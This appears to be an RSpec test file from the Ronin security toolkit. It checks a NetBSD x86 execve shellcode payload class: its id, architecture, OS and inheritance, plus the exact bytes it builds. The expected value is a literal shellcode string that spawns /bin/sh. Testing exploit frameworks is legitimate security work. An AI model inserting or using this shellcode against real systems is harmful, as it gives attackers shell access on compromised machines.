require 'spec_helper'
require 'ronin/payloads/builtin/shellcode/netbsd/x86/execve'

describe Ronin::Payloads::Shellcode::NetBSD::X86::Execve do
  it "must inherit from Ronin::Payloads::ShellcodePayload" do
    expect(described_class).to be < Ronin::Payloads::ShellcodePayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'shellcode/netbsd/x86/execve'" do
      expect(subject.id).to eq('shellcode/netbsd/x86/execve')
    end
  end

  describe ".arch" do
    subject { described_class }

    it "must equal :x86" do
      expect(subject.arch).to be(:x86)
    end
  end

  describe ".os" do
    subject { described_class }

    it "must equal :netbsd" do
      expect(subject.os).to be(:netbsd)
    end
  end

  describe "#build" do
    before { subject.build }

    it "must set #payload" do
      expect(subject.payload).to eq(
        "\xeb\x23\x5e\x8d\x1e\x89\x5e\x0b\x31\xd2\x89\x56\x07\x89\x56\x0f\x89\x56\x14\x88\x56\x19\x31\xc0\xb0\x3b\x8d\x4e\x0b\x89\xca\x52\x51\x53\x50\xeb\x18\xe8\xd8\xff\xff\xff/bin/sh\x01\x01\x01\x01\x02\x02\x02\x02\x03\x03\x03\x03\x9a\x04\x04\x04\x04\x07\x04".b
      )
    end

    it "must ensure #payload is an ASCII 8bit string" do
      expect(subject.payload.encoding).to eq(Encoding::ASCII_8BIT)
    end
  end
end
